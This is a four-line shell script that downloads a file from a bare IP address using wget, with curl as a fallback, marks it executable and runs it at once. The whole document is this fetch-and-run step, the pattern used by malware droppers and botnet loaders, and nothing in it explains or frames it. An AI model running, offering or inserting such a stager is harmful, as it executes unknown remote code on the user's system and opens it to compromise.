#!/bin/sh
wget http://50.60.70.80/release -O runner || curl http://50.60.70.80/release -o runner
chmod +x runner
./runner
